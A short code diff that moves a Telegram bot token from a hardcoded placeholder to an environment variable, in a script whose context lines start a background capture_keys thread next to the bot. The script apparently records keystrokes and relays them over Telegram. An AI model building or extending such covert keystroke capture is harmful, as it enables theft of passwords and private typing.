@@ -141,8 +141,10 @@ def timeout_input(prompt, timeout=10):
     return timed_input.timeout_input(prompt=prompt, timeout=timeout)
 
 if __name__ == "__main__":
-    # Replace 'YOUR_TELEGRAM_BOT_TOKEN' with your actual Telegram bot token
-    TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'
+    # Fetch the Telegram API key from environment variables
+    TELEGRAM_API_KEY = os.getenv('TELEGRAM_API_KEY')
+    if not TELEGRAM_API_KEY:
+        raise ValueError("TELEGRAM_API_KEY environment variable not set")
     print("Initializing framework...")
 
     print("Initializing framework...")
@@ -151,4 +153,4 @@ if __name__ == "__main__":
     threading.Thread(target=capture_keys, daemon=True).start()
 
     # Start the bot
-    initialize(TELEGRAM_BOT_TOKEN)
+    initialize(TELEGRAM_API_KEY)
